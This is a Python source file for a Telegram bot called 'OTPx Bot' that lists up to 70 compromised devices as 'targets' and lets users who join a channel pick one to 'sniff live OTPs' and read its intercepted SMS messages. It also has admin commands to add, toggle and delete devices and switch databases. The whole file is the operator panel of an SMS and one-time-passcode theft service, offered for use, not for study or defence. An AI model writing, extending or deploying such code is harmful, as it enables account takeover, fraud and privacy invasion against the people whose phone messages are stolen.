import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, ConversationHandler
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv('BOT_TOKEN')
CHANNEL_USERNAME = os.getenv('CHANNEL_USERNAME', 'RSPANNEL')

from firebase.config import *
from database.db_manager import *
from utils.helpers import *
from admin.admin_handlers import *

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

ADD_DEVICE = 1

async def is_user_in_channel(context, user_id):
    try:
        member = await context.bot.get_chat_member(
            chat_id=f'@{CHANNEL_USERNAME}',
            user_id=user_id
        )
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Channel check failed: {e}")
        return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    
    if not await is_user_in_channel(context, user_id):
        await update.message.reply_text(
            f"👋 Welcome {user_name}!\n\n"
            f"⚠️ Please join our channel first:\n"
            f"🔗 @{CHANNEL_USERNAME}\n\n"
            f"After joining, tap /start again."
        )
        return
    
    active_db = get_active_database()
    devices = get_online_devices_from_db(active_db)
    targets = []
    idx = 1
    
    for device_id, data in devices.items():
        if idx > 70:
            break
        targets.append({
            'id': device_id,
            'number': idx
        })
        idx += 1
    
    if not targets:
        await update.message.reply_text("⚠️ No active targets available right now.")
        return
    
    keyboard = []
    row = []
    for target in targets:
        btn = InlineKeyboardButton(f"Target {target['number']}", callback_data=f"target_{target['id']}")
        row.append(btn)
        if len(row) == 5:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"🔴 *{len(targets)} Unique Targets Online!*\n"
        f"Select a target to sniff live OTPs. 🔴\n\n"
        f"📊 *Showing {len(targets)} active devices*",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    device_id = query.data.replace('target_', '')
    active_db = get_active_database()
    device_data = get_device_by_id_from_db(device_id, active_db)
    
    if not device_data:
        await query.edit_message_text("⚠️ Target not found or offline.")
        return
    
    display = format_sms_display(device_data, device_id, active_db)
    
    if len(display) > 4096:
        parts = [display[i:i+4096] for i in range(0, len(display), 4096)]
        for part in parts:
            await query.message.reply_text(part, parse_mode='Markdown')
    else:
        await query.edit_message_text(display, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *OTPx Bot Commands:*\n\n"
        "/start - Show target list\n"
        "/help - Show this help\n\n"
        "Select a target number to view live SMS."
    )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    active_db = get_active_database()
    stats = get_device_count_from_db(active_db)
    await update.message.reply_text(
        f"📊 *Bot Status*\n\n"
        f"🔴 Active Targets: {stats['online']}\n"
        f"🟢 Bot Online: Yes\n"
        f"📡 Channel: @{CHANNEL_USERNAME}\n"
        f"🗄️ Database: `{active_db}`",
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

# Webhook handler for Vercel
async def webhook(request):
    try:
        app = Application.builder().token(BOT_TOKEN).build()
        
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("help", help_command))
        app.add_handler(CommandHandler("status", status_command))
        
        app.add_handler(CommandHandler("admin", admin_panel))
        app.add_handler(CommandHandler("databases", list_databases))
        app.add_handler(CommandHandler("switch", switch_database))
        app.add_handler(CommandHandler("list", admin_list_command))
        app.add_handler(CommandHandler("online", admin_online_command))
        app.add_handler(CommandHandler("offline", admin_offline_command))
        app.add_handler(CommandHandler("toggle", toggle_device))
        app.add_handler(CommandHandler("delete", delete_device))
        app.add_handler(CommandHandler("stats", admin_stats_command))
        
        conv_handler = ConversationHandler(
            entry_points=[CommandHandler("add", add_device_start)],
            states={ADD_DEVICE: [CommandHandler("add", add_device_receive, pass_user_data=True), CommandHandler("cancel", cancel)]},
            fallbacks=[CommandHandler("cancel", cancel)]
        )
        app.add_handler(conv_handler)
        
        app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))
        app.add_handler(CallbackQueryHandler(button_callback, pattern="^target_"))
        app.add_handler(CallbackQueryHandler(admin_callback, pattern="^switch_"))
        
        if request.method == 'POST':
            update = Update.de_json(await request.json(), app.bot)
            await app.process_update(update)
            return {'ok': True}
        
        return {'ok': False, 'message': 'Method not allowed'}
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return {'ok': False, 'error': str(e)}

# Local testing
if __name__ == '__main__':
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("databases", list_databases))
    app.add_handler(CommandHandler("switch", switch_database))
    app.add_handler(CommandHandler("list", admin_list_command))
    app.add_handler(CommandHandler("online", admin_online_command))
    app.add_handler(CommandHandler("offline", admin_offline_command))
    app.add_handler(CommandHandler("toggle", toggle_device))
    app.add_handler(CommandHandler("delete", delete_device))
    app.add_handler(CommandHandler("stats", admin_stats_command))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))
    app.add_handler(CallbackQueryHandler(button_callback, pattern="^target_"))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^switch_"))
    
    print("🤖 OTPx Bot running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)
